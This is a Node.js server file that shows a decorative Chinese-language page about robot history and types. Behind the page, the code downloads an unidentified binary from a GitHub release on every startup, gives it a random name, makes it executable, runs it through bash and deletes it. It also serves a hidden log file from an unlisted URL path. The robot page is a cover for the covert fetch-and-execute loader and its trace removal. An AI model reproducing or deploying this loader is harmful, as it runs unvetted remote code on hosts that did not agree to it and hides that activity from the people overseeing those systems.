const http = require("http");
const fs = require('fs');
const axios = require('axios');
const { exec } = require('child_process');
const PORT = process.env.PORT || 3000;
const SUB_PATH  =  process.env.SUB_PATH || 'log';
const htmlContent = `
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>机器人世界 - 探索未来科技</title>
    <style>
        body {
            font-family: 'Microsoft YaHei', Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 0;
            color: #333;
            background-color: #f5f5f5;
        }
        header {
            background: linear-gradient(135deg, #6e8efb, #a777e3);
            color: white;
            padding: 2rem 0;
            text-align: center;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
        }
        .container {
            width: 85%;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        h1 {
            font-size: 2.5rem;
            margin-bottom: 0.5rem;
        }
        h2 {
            color: #444;
            border-bottom: 2px solid #a777e3;
            padding-bottom: 0.5rem;
            margin-top: 2rem;
        }
        .intro {
            font-size: 1.1rem;
            margin-bottom: 2rem;
        }
        .robot-card {
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            margin-bottom: 2rem;
            overflow: hidden;
            transition: transform 0.3s ease;
        }
        .robot-card:hover {
            transform: translateY(-5px);
        }
        .robot-img {
            width: 100%;
            height: 300px;
            object-fit: cover;
        }
        .robot-content {
            padding: 1.5rem;
        }
        .robot-type {
            display: inline-block;
            background: #a777e3;
            color: white;
            padding: 0.3rem 0.8rem;
            border-radius: 20px;
            font-size: 0.9rem;
            margin-bottom: 0.5rem;
        }
        .robot-title {
            font-size: 1.5rem;
            margin: 0.5rem 0;
            color: #333;
        }
        footer {
            background: #333;
            color: white;
            text-align: center;
            padding: 1.5rem 0;
            margin-top: 2rem;
        }
        .timeline {
            position: relative;
            max-width: 1200px;
            margin: 2rem auto;
        }
        .timeline::after {
            content: '';
            position: absolute;
            width: 6px;
            background-color: #a777e3;
            top: 0;
            bottom: 0;
            left: 50%;
            margin-left: -3px;
        }
        .timeline-item {
            padding: 10px 40px;
            position: relative;
            background-color: inherit;
            width: 50%;
            box-sizing: border-box;
        }
        .timeline-item::after {
            content: '';
            position: absolute;
            width: 25px;
            height: 25px;
            right: -12px;
            background-color: white;
            border: 4px solid #a777e3;
            top: 15px;
            border-radius: 50%;
            z-index: 1;
        }
        .left {
            left: 0;
        }
        .right {
            left: 50%;
        }
        .left::before {
            content: " ";
            height: 0;
            position: absolute;
            top: 22px;
            width: 0;
            z-index: 1;
            right: 30px;
            border: medium solid #a777e3;
            border-width: 10px 0 10px 10px;
            border-color: transparent transparent transparent #a777e3;
        }
        .right::before {
            content: " ";
            height: 0;
            position: absolute;
            top: 22px;
            width: 0;
            z-index: 1;
            left: 30px;
            border: medium solid #a777e3;
            border-width: 10px 10px 10px 0;
            border-color: transparent #a777e3 transparent transparent;
        }
        .right::after {
            left: -12px;
        }
        .timeline-content {
            padding: 20px 30px;
            background-color: white;
            position: relative;
            border-radius: 6px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        @media screen and (max-width: 768px) {
            .timeline::after {
                left: 31px;
            }
            .timeline-item {
                width: 100%;
                padding-left: 70px;
                padding-right: 25px;
            }
            .timeline-item::before {
                left: 60px;
                border: medium solid #a777e3;
                border-width: 10px 10px 10px 0;
                border-color: transparent #a777e3 transparent transparent;
            }
            .left::after, .right::after {
                left: 18px;
            }
            .right {
                left: 0%;
            }
        }
    </style>
</head>
<body>
    <header>
        <div class="container">
            <h1>探索机器人世界</h1>
            <p>从工业机械臂到人工智能伙伴 - 机器人的进化之旅</p>
        </div>
    </header>

    <div class="container">
        <section class="intro">
            <p>机器人技术正在以前所未有的速度改变着我们的世界。从工厂车间到家庭生活，从医疗手术到太空探索，机器人已经成为人类社会发展不可或缺的一部分。本网站将带您了解机器人的不同类型、发展历史以及未来趋势。</p>
        </section>

        <h2>机器人类型</h2>
        <div class="robot-card">
            <img src="https://images.unsplash.com/photo-1593508512255-86ab42a8e620?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80" alt="工业机器人" class="robot-img">
            <div class="robot-content">
                <span class="robot-type">工业应用</span>
                <h3 class="robot-title">工业机器人</h3>
                <p>工业机器人是自动化生产线的核心，广泛应用于汽车制造、电子产品组装、食品加工等领域。它们能够24小时不间断工作，完成焊接、喷涂、搬运等高精度、高强度任务，大大提高了生产效率和产品质量。</p>
                <p>现代工业机器人通常配备先进的传感器和视觉系统，能够实现自适应控制和柔性生产。协作机器人(cobot)的出现更是让机器人能够与人类工人安全地共享工作空间。</p>
            </div>
        </div>

        <div class="robot-card">
            <img src="https://images.unsplash.com/photo-1575505586569-646b2ca898fc?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80" alt="服务机器人" class="robot-img">
            <div class="robot-content">
                <span class="robot-type">日常生活</span>
                <h3 class="robot-title">服务机器人</h3>
                <p>服务机器人正逐渐走进我们的日常生活，从扫地机器人到餐厅服务机器人，从导览机器人到陪伴机器人。它们为人类提供各种便利服务，改善生活质量。</p>
                <p>医疗机器人是服务机器人的重要分支，达芬奇手术系统等医疗机器人能够协助医生完成微创手术，提高手术精度，减少患者创伤。康复机器人则帮助患者进行肢体功能恢复训练。</p>
            </div>
        </div>

        <div class="robot-card">
            <img src="https://images.unsplash.com/photo-1620712943543-bcc4688e7485?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80" alt="特种机器人" class="robot-img">
            <div class="robot-content">
                <span class="robot-type">特殊环境</span>
                <h3 class="robot-title">特种机器人</h3>
                <p>特种机器人设计用于执行危险或人类难以到达的环境中的任务。包括排爆机器人、深海探测机器人、核电站维护机器人、消防救援机器人等。</p>
                <p>太空机器人是特种机器人的重要代表，如火星探测器"毅力号"和"祝融号"，它们能够在极端环境下执行科学探测任务，为人类探索宇宙提供宝贵数据。</p>
            </div>
        </div>

        <h2>机器人发展历史</h2>
        <div class="timeline">
            <div class="timeline-item left">
                <div class="timeline-content">
                    <h3>1954年 - 第一台工业机器人</h3>
                    <p>乔治·德沃尔(George Devol)发明了第一台可编程工业机器人"Unimate"，并于1961年在通用汽车工厂投入使用，用于处理热压铸件。</p>
                </div>
            </div>
            <div class="timeline-item right">
                <div class="timeline-content">
                    <h3>1966年 - 第一台移动机器人</h3>
                    <p>斯坦福研究所开发的"Shakey"被认为是第一台具有人工智能的移动机器人，能够感知环境并自主导航。</p>
                </div>
            </div>
            <div class="timeline-item left">
                <div class="timeline-content">
                    <h3>1973年 - 第一台电动工业机器人</h3>
                    <p>德国库卡公司(KUKA)推出了Famulus，这是世界上第一台具有六个电动驱动轴的工业机器人。</p>
                </div>
            </div>
            <div class="timeline-item right">
                <div class="timeline-content">
                    <h3>1997年 - 火星探测机器人</h3>
                    <p>NASA的"旅居者号"(Sojourner)成为第一台在火星表面成功运行的机器人探测器，开启了行星探测的新纪元。</p>
                </div>
            </div>
            <div class="timeline-item left">
                <div class="timeline-content">
                    <h3>2000年 - 人形机器人突破</h3>
                    <p>本田公司推出ASIMO人形机器人，展示了复杂的两足行走能力和人机交互功能。</p>
                </div>
            </div>
            <div class="timeline-item right">
                <div class="timeline-content">
                    <h3>2011年 - 人工智能助手</h3>
                    <p>苹果推出Siri，标志着人工智能语音助手开始进入消费市场，改变了人机交互方式。</p>
                </div>
            </div>
            <div class="timeline-item left">
                <div class="timeline-content">
                    <h3>2020年 - 机器人抗疫</h3>
                    <p>新冠疫情期间，消毒机器人、配送机器人等在各种场景中发挥重要作用，减少人际接触风险。</p>
                </div>
            </div>
        </div>

        <h2>未来趋势</h2>
        <div class="robot-card">
            <img src="https://images.unsplash.com/photo-1620712943543-bcc4688e7485?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80" alt="未来机器人" class="robot-img">
            <div class="robot-content">
                <p><strong>人工智能融合：</strong> 未来的机器人将更加智能化，深度学习和神经网络技术将使机器人具备更强的自主决策和学习能力。</p>
                <p><strong>人机协作：</strong> 协作机器人将更加普及，能够安全地与人类共同工作，适应复杂多变的环境。</p>
                <p><strong>柔性机器人：</strong> 仿生设计和新型材料将催生更多柔性机器人，能够执行更精细、更灵活的任务。</p>
                <p><strong>群体智能：</strong> 多机器人协作系统将得到发展，通过群体智能完成复杂任务，如灾害救援、农业管理等。</p>
                <p><strong>脑机接口：</strong> 直接通过脑电波控制机器人将成为可能，为残障人士提供全新的生活辅助方式。</p>
            </div>
        </div>
    </div>

    <footer>
        <div class="container">
            <p>&copy; 2023 机器人世界 | 探索科技未来</p>
            <p>本网站图片来源于Unsplash，仅用于教育目的</p>
        </div>
    </footer>
</body>
</html>
`;
const server = http.createServer((req, res) => {
  if (req.url === '/') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(htmlContent);
  } 
  else if (req.url === `/${SUB_PATH}`) {
    fs.readFile("./.npm/log.txt", "utf8", (err, data) => {
      if (err) {
        console.error(err);
        res.writeHead(500, { 'Content-Type': 'text/plain' });
        res.end("Error reading log.txt");
      } else {
        res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
        res.end(data);
      }
    });
  }
});

const downloadFile = async () => {
  try {
    const url = "https://github.com/derwalld/glitchsh/releases/download/v1.0.0/default"
    const randomFileName = Math.random().toString(36).substring(2, 12);
    const response = await axios({
      method: 'get',
      url: url,
      responseType: 'stream'
    });

    const writer = fs.createWriteStream(randomFileName);
    response.data.pipe(writer);

    return new Promise((resolve, reject) => {
      writer.on('finish', () => {
        console.log(`${randomFileName} download completed`);
        exec(`chmod +x ${randomFileName}`, (err) => {
          if (err) reject(err);
          resolve(randomFileName);
        });
      });
      writer.on('error', reject);
    });
  } catch (err) {
    throw err;
  }
};

const Execute = async () => {
  try {
    const fileName = await downloadFile();
    const command = `./${fileName}`;
    exec(command, { 
      shell: '/bin/bash'
    }, () => {
      fs.unlink(fileName, () => {});
    });
  } catch (err) {
    console.error('Error executing command:', err);
  }
};

server.listen(PORT, () => {
  Execute();
  console.log(`Server is running on port:${PORT}`);
});